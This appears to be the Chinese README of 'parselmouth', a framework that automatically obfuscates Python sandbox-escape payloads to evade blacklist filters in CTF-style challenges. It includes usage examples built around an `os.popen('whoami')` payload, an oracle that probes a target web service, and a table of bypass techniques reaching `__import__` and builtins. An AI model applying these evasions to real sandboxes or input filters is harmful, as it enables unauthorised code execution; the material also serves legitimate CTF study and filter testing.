# parselmouth
一个自动化的 Python 沙箱逃逸 payload bypass 框架

English README: [README_EN.md](README_EN.md)

<img alt="image" src="https://github.com/Macr0phag3/parselmouth/blob/master/pic/cases.png">

<img alt="image" src="https://github.com/Macr0phag3/parselmouth/blob/master/pic/main.png">

## 1. 快速入门
- python 版本最好是 >= 3.10
- 安装依赖: `pip install -r requirements`

### 1.1 通过 CLI 使用
- CLI 入口为 `cli.py`；`parselmouth.py` 主要作为 import 时的核心库使用
- 获取帮助信息：`python cli.py -h`
- 指定 payload 与 rule: `python cli.py --payload "__import__('os').popen('whoami').read()" --rule "__" "." "'" '"' "read" "chr"`
  - 当然，很多时候规则字符比较多，所以你也可以考虑通过参数 `--re-rule` 来指定正则表达式格式的黑名单规则，例如 `--re-rule '[0-9]'` 等价于 `--rule "0" "1" "2" "3" "4" "5" "6" "7" "8" "9"`
  - 友情提示，通过 win 命令行使用，如果需要指定 `"`，则要用 `"\""`，如果用 `'"'` 会出现非预期情况（我大概知道是啥原因但是我懒得管 win :)
- 可以通过 `--specify-bypass` 指定 bypass function 的黑白名单；例如如果不希望 int 通过 unicode 字符的规范化进行 bypass，可以指定参数: `--specify-bypass '{"black": {"Bypass_Int": "by_unicode"}}'`
- `--shortest`：寻找最小的 exp
- `--minset`：寻找最小字符集的 exp
- CLI 输出基于 Rich，默认会显示运行配置、实时状态和最终摘要
- 通过 `-v/-vv/-vvv` 控制过程输出分级：
  - `0`（默认）：只看运行摘要
  - `-v`：看简洁信息
  - `-vv`：看目标 payload 与最终选中的尝试链路
  - `-vvv`：看详细的尝试过程
- 注意：某些 bypass 会附带 payload warning，因为本地 bypass 无法预知实际情况，最终结果面板会提示适用风险，并给出可直接复制的禁用配置

在定制化 bypass 函数之后，建议至少跑一下这两类测试：

- `python run_test.py`：doctest 风格的功能回归测试
- `python stress_test.py`：遍历当前 bypass 方法的覆盖测试
- `python stress_test.py --extended`：额外跑深度/长度压力 case
- `python stress_test.py --match "Bypass_Subscript"`：只跑指定类别的 case

### 1.2 通过 import 使用
```python
import parselmouth as p9h


p9h.BLACK_CHAR = {"kwd": [".", "'", '"']}
# p9h.BLACK_CHAR = {"re_kwd": "\.|'|\""}  # 或者这样
runner = p9h.P9H(
    "__import__('os').popen('whoami').read()",
    specify_bypass_map={"black": {"Bypass_Name": "by_unicode"}},
    min_len=False, verbose=0,
)
result = runner.visit()
status, c_result = p9h.color_check(result)
if status:
    print("bypass success")
    print("payload:", runner.source_code)
    print("exp:", result)
```

`p9h.P9H` 关键参数解释：
- `source_code`: 需要 bypass 的 payload
- `specify_bypass_map`: 指定 bypass function 的黑白名单；例如如果不希望变量名通过 unicode 字符的规范化进行 bypass，可以传参 `{"black": {"Bypass_Name": "by_unicode"}}`；多个函数请写成 `"by_func1, by_func2"` 这种逗号分隔字符串
- `min_len`: 寻找最短的 exp
- `min_set`: 寻找最小字符集的 exp
- `verbose`: 输出的详细程度（`0` ~ `3`）
  - `0`: 只输出最终摘要
  - `1`: 输出简洁的 bypass 进度
  - `2`: 输出目标 payload 和最终选中的尝试链路
  - `3`: 输出详细的尝试过程
- `status`: 可选；传入 `p9h.RuntimeStatus(p9h.console)` 后，可以在自行嵌入时也启用实时状态栏
- `depth`: 通常情况下不需要使用这个参数；打印信息时所需要的缩进数量
- `bypass_history`: 通常情况下不需要手动传；现在除了成功/失败缓存之外，还会记录 `runs`、`nodes`、`attempts` 等 trace 数据，值示例 `{"success": {}, "failed": set(), "runs": {}, "nodes": {}, "attempts": {}}`

### 1.3 定制化使用
**在定制化之前，最好先阅读下[这篇解释原理的文章](https://www.tr0y.wang/2024/03/04/parselmouth/)以及 `parselmouth.py`、`bypass_tools.py`、`cli.py`、`ui.py` 的主要代码**

方法一：参考文章 [传送门](https://www.tr0y.wang/2024/03/04/parselmouth/#%E5%AE%9A%E5%88%B6%E5%8C%96%E5%BC%80%E5%8F%91)

方法二：
- 要新增一个 ast 类型的识别与处理，需要在 `parselmouth.py` 中的 `P9H` 新增一个 `visit_` 方法
- 如果希望通过与目标交互的方式进行 payload 检查，可以改写 check 方法，原则是如果检查通过返回空 `[]`；如果检查不通过的话，最好是返回不通过的字符，如果条件有限，返回任意不为空的列表也可以
- 对已有的 ast 类型，需要新增不同的处理函数，则需要在 `bypass_tools.py` 中找到对应的 bypass 类型，并新增一个 `by_` 开头的方法。同一个类下的 bypass 函数，使用顺序取决于对应类中定义的顺序，先被定义的函数会优先尝试进行 bypass
- 如果希望调整 CLI 的配置面板、trace tree 或结果摘要，可以看 `ui.py`

#### 自定义 bypass 函数
以字符串 bypass 为例。假设希望将 `macr0phag3` 转为 base64 解码语句 `__import__('base64').b64decode(b'bWFjcjBwaGFnMw==')`，则可以给 `bypass_tools.py` 的 `Bypass_String` 动态挂一个新的 `by_` 方法：

```python
import base64

import parselmouth as p9h
import bypass_tools


@bypass_tools.recursion_protect
def by_base64(self):
    encoded = base64.b64encode(self.node._value.encode())
    return self.P9H(
        f'__import__("base64").b64decode({encoded!r})'
    ).visit()


bypass_tools.Bypass_String.by_base64 = by_base64
bypass_tools.Bypass_String.by_base64.__qualname__ = "Bypass_String.by_base64"

p9h.BLACK_CHAR = {"kwd": ["mac", "::", "by_char", "bytes", "chr", "dict"]}
runner = p9h.P9H(
    "'macr0phag3'",
    specify_bypass_map={"white": {"Bypass_String": "by_base64"}},
    verbose=2,
)
result = runner.visit()
status, c_result = p9h.color_check(result)
print(status, c_result, result)
```

如果希望覆盖自带的 bypass，也可以直接用同样的赋值方式替换已有方法：

```python
bypass_tools.Bypass_String.by_char = by_base64
bypass_tools.Bypass_String.by_char.__qualname__ = "Bypass_String.by_char"
```

定制完 bypass 之后，如果想补测试，可以把 payload、rule、answer 按 `test_case.py` 里现有的格式加进去，再跑：

```bash
python run_test.py
```

#### 自定义检查函数
默认的 `check` 会根据 `kwd` / `re_kwd` 在本地检查 payload 是否命中黑名单：

```python
def check(payload, ignore_space=False):
    if isinstance(payload, ast.AST):
        payload = ast.unparse(payload)

    return [i for i in BLACK_CHAR if i in str(payload)]
```

由于 check 有时候测试成本很高（例如触发大量的网络请求等），因此 `p9h.check` 在第一次创建 `P9H` 时会自动包上一层缓存加速；如果你替换成自定义 oracle，一般不需要额外手动做缓存加速处理。

但在真实场景里，payload 往往需要通过网络请求去验证。比如目标是一个 web 应用，此时可以直接改写全局的 `p9h.check`，把目标服务当成 oracle：

```python
import time
import requests

import parselmouth as p9h


def check(payload, ignore_space=False):
    result = requests.post(
        "http://127.0.0.1:5000/challenge",
        json={"exp": payload},
        timeout=5,
    ).text
    time.sleep(0.1)  # 防止过快导致 DoS
    if "hacker" in result:
        return [result]
    return []


p9h.check = check
runner = p9h.P9H("__import__('os').popen('whoami').read()", verbose=2)
result = runner.visit()
status, c_result = p9h.color_check(result)
if status:
    print("bypass success")
    print("payload:", runner.source_code)
    print("exp:", result)
```

这个 `check` 需要遵守一个简单约定：
- 检查通过时返回空列表 `[]`
- 检查不通过时返回非空列表；最好把命中的关键字放进去，如果实在拿不到，返回任意非空列表也可以

下面给一个最小的 flask 搭配测试服务的例子：

```python
from flask import Flask, jsonify, request

app = Flask(__name__)


@app.route("/challenge", methods=["POST"])
def check_exp():
    data = request.json
    exp = str(data.get("exp"))

    if exp is None:
        return jsonify({"error": "Missing 'exp' parameter"}), 400

    forbidden_chars = ["'", '"', ".", "popen"]
    for char in forbidden_chars:
        if char in exp:
            return jsonify({"error": "hacker!"}), 400

    return jsonify({"message": "Expression is valid"}), 200


if __name__ == "__main__":
    app.run(debug=True)
```


## 2. 当前 bypass function

目前支持：

|  类   |   方法名  | payload | bypass | 解释说明 |
| ----- | -------- | ------- | ------- | ----- |
| Bypass_Int    | by_trans | `0` | `len(())` | |
| Bypass_Int    | by_bin   | `10` | `0b1010` |将数字转为二进制 |
| Bypass_Int    | by_hex   | `10` | `0xa`    |将数字转为十六进制 |
| Bypass_Int    | by_cal   | `10` | `5*2`    |将数字转为算式 |
| Bypass_Int    | by_unicode   | `10` | `int('𝟣𝟢')`    | int + unicode 绕过|
| Bypass_Int    | by_ord   | `10` | `ord('\n')`    | ord 绕过|

|  类   |   方法名  | payload | bypass | 解释说明 |
| ----- | -------- | ------- | ------- | ----- |
| Bypass_String    | by_empty_str   | `""` | `str()`  | 构造空字符串 |
| Bypass_String    | by_quote_trans   | `"macr0phag3"` | `'macr0phag3'`  | 单双引号互相替换 |
| Bypass_String    | by_reverse   | `"macr0phag3"` | `"3gahp0rcam"[::-1]`    | 字符串逆序绕过|
| Bypass_String    | by_char   | `"macr0phag3"` |  `(chr(109) + chr(97) + chr(99) + chr(114) + chr(48) + chr(112) + chr(104) + chr(97) + chr(103) + chr(51))`   | char 绕过字符限制|
| Bypass_String    | by_dict   | `"macr0phag3"` | `list(dict(amacr0phag3=()))[0][1:]`  | dict 绕过限制|
| Bypass_String    | by_bytes_single   | `"macr0phag3"` | `str(bytes([109]))[2] + str(bytes([97]))[2] + str(bytes([99]))[2] + str(bytes([114]))[2] + str(bytes([48]))[2] + str(bytes([112]))[2] + str(bytes([104]))[2] + str(bytes([97]))[2] + str(bytes([103]))[2] + str(bytes([51]))[2]`  | bytes 绕过限制|
| Bypass_String    | by_bytes_full   | `"macr0phag3"` | `bytes([109, 97, 99, 114, 48, 112, 104, 97, 103, 51]).decode()`  | bytes 绕过限制 2 |
| Bypass_String    | by_format   | `"macr0phag3"` | `'{}{}{}{}{}{}{}{}{}{}'.format(chr(109), chr(97), chr(99), chr(114), chr(48), chr(112), chr(104), chr(97), chr(103), chr(51))`  | format 绕过限制 |
| Bypass_String    | by_hex_encode   | `"macr0phag3"` | `"\x6d\x61\x63\x72\x30\x70\x68\x61\x67\x33"`  | hex 编码绕过限制 |
| Bypass_String    | by_unicode_encode   | `"macr0phag3"` | `"\u006d\u0061\u0063\u0072\u0030\u0070\u0068\u0061\u0067\u0033"`  | unicode 编码绕过限制 |
| Bypass_String    | by_char_format   | `"macr0phag3"` | `"%c%c%c%c%c%c%c%c%c%c%c%c" % (95,95,98,117,105,108,116,105,110,115,95,95)`  | %c format 编码绕过限制，[@chi111i](https://github.com/chi111i) |
| Bypass_String    | by_char_add   | `"macr0phag3"` | `'m'+'a'+'c'+'r'+'0'+'p'+'h'+'a'+'g'+'3'`  | 字符加法运算绕过限制，[@chi111i](https://github.com/chi111i) |

|  类   |   方法名  | payload | bypass | 解释说明 |
| ----- | -------- | ------- | ------- | ----- |
| Bypass_Name    | by_ligature   | `system` | `syﬆem` | 利用 NFKC 连字字符替换标识符片段 |
| Bypass_Name    | by_unicode   | `__import__` | `_＿import_＿` | unicode 绕过|
| Bypass_Name    | by_builtins_attr   | `__import__` | `__builtins__.__import__` | 从模块形态的 `__builtins__` 获取 name |
| Bypass_Name    | by_builtins_item   | `__import__` | `__builtins__['__import__']` | 从字典形态的 `__builtins__` 获取 name |
| Bypass_Name    | by_builtin_func_self   | `__import__` | `id.__self__.__import__` | 通过任意 `builtin_function_or_method.__self__` 拿到 builtins，自动选择可用入口 |
| Bypass_Name    | by_frame   | `__import__` | `(i for i in ()).gi_frame.f_builtins['__import__']` | 通过生成器 frame 的 `f_builtins` 获取 name |
| Bypass_Name    | by_running_frame   | `__import__` | `[[*a[0]].pop() for a in [[]] if [a.append((i.gi_frame.f_back for i in a))]][0].f_back.f_builtins['__import__']` | 通过运行中生成器回溯到 caller frame 的 `f_builtins` 获取 name |

|  类   |   方法名  | payload | bypass | 解释说明 |
| ----- | -------- | ------- | ------- | ----- |
| Bypass_String  | by_doc_index | `'system'` | `help.__doc__[...]+...` | 从可用 builtin 的 `__doc__` 文本中切字符拼字符串 |
| Bypass_Attribute    | by_ligature   | `os.system` | `os.syﬆem` | 利用 NFKC 连字字符替换属性名 |
| Bypass_Attribute    | by_unicode   | `os.system` | `os.𝒔ystem` | unicode 绕过属性名拦截 |
| Bypass_Attribute    | by_getattr   | `str.find` | `getattr(str, 'find')` | getattr 绕过，相关思路参考 [@chi111i](https://github.com/chi111i) |
| Bypass_Attribute    | by_vars   | `str.find` | `vars(str)["find"]` | vars 绕过|
| Bypass_Attribute    | by_dict_attr   | `str.find` | `str.__dict__["find"]` | `__dict__` 绕过|

|  类   |   方法名  | payload | bypass | 解释说明 |
| ----- | -------- | ------- | ------- | ----- |
| Bypass_Subscript    | by_getitem_attr   | `a[0]` / `a[1:2]` | `a.__getitem__(0)` / `a.__getitem__(slice(1,2))` | 把一元下标/切片访问改写成 `__getitem__` 调用；多维索引暂时回退原样 |
| Bypass_Subscript    | by_getitem_getattr   | `a[0]` / `a[:2]` | `getattr(a, '__getitem__')(0)` / `getattr(a, '__getitem__')(slice(None,2))` | 通过 `getattr` 获取 `__getitem__` 后再调用；多维索引暂时回退原样 |

|  类   |   方法名  | payload | bypass | 解释说明 |
| ----- | -------- | ------- | ------- | ----- |
| Bypass_Call    | by_builtin_func_self / by_getattr / by_vars ...   | `__import__('os')` / `os.system(1)` | `id.__self__.__import__('os')` / `vars(os)['system'](1)` | 动态包装被调用对象对应的 bypass，再统一交给 `try_bypass` 选择 |

|  类   |   方法名  | payload | bypass | 解释说明 |
| ----- | -------- | ------- | ------- | ----- |
| Bypass_Keyword    | by_ligature   | `dict(system=1)` | `dict(syﬆem=1)` | 利用 NFKC 连字字符替换关键字参数名 |
| Bypass_Keyword    | by_unicode   | `str(object=1)` | `str(ᵒbject=1)` | unicode 绕过关键字参数名拦截 |

|  类   |   方法名  | payload | bypass | 解释说明 |
| ----- | -------- | ------- | ------- | ----- |
| Bypass_BoolOp    | by_bitwise   | `'yes' if 1 and (2 or 3) or 2 and 3 else 'no'` | `'yes' if 1&(2\|3)\|2&3 else 'no'` | `and/or` 替换成 `&\|`，[@chi111i](https://github.com/chi111i) |
| Bypass_BoolOp    | by_arithmetic   | `'yes' if (__import__ and (2 or 3)) or (2 and 3) else 'no'` | `'yes' if bool(bool(__imp𝒐rt__)*bool(bool(2)+bool(3)))+bool(bool(2)*bool(3)) else 'no'` | `and/or` 替换成基础运算，[@chi111i](https://github.com/chi111i) |


以及上述所有方法的组合 bypass。

如果在使用的过程中发现有比较好用的 bypass 手法，或者任何问题都可以提交 issue :D

以及不论通过或没通过这个工具解开题目，都欢迎提交 issue 帮忙补充案例，我会统一放在 `challenges` 中供大家学习使用，多谢啦

## 3. TODO

- [ ] `exec`、`eval` + `open` 执行库代码
- [ ] `'__buil''tins__'` -> `str.__add__('__buil', 'tins__')`
- [ ] `__import__` -> `__loader__().load_module`
- [ ] `",".join("123")` -> `"".__class__.join(",", "123")`
- [ ] `",".join("123")` -> `str.join(",", "123")`
- [ ] `"0123456789"` -> `sorted(set(str(hash(()))))`
- [ ] `2024` -> `next(reversed(range(2025)))`
- [ ] `{"a": 1}["a"]` -> `{"a": 1}.pop("a")`
- [ ] `1` -> `int(max(max(dict(a၁=()))))`
- [ ] `[i for i in range(10) if i == 5]` -> `[[i][0]for(i)in(range(10))if(i)==5]`
- [ ] `==` -> `in`
- [ ] 必要的空格 -> `\t`/...
- [ ] ~~`True or False` -> `bool(- (True) - (False))`~~ 感觉不实用
- [ ] `[2, 20, 30]` -> `[i for i in range(31) for j in range(31) if i==0 and j == 2 or i == 1 and j ==20 or i == 2 and j == 30]`

## 4. Others
<img src="https://clean-1252075454.cos.ap-nanjing.myqcloud.com/20200528120800990.png" width="400">

[![Stargazers over time](https://starchart.cc/Macr0phag3/parselmouth.svg)](https://starchart.cc/Macr0phag3/parselmouth)
